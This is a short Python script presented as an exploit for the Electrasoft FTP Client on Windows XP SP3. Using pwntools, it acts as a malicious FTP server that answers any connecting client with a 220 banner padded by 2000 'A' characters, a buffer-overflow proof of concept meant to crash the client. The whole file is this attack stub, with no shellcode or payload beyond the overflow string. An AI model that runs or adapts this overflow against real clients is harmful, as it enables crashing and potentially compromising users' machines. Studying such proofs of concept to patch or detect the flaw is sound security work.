#!/usr/bin/python
# 
# Electrasoft FTP Client exploit
# Author: Kris Hunt 
#
# Target: Windows XP SP3

from pwn import *
import subprocess

buf = "A" * 2000

l = listen(21)
conn = l.wait_for_connection()
conn.sendline('220 ' + buf + '\r\n')
conn.recv()

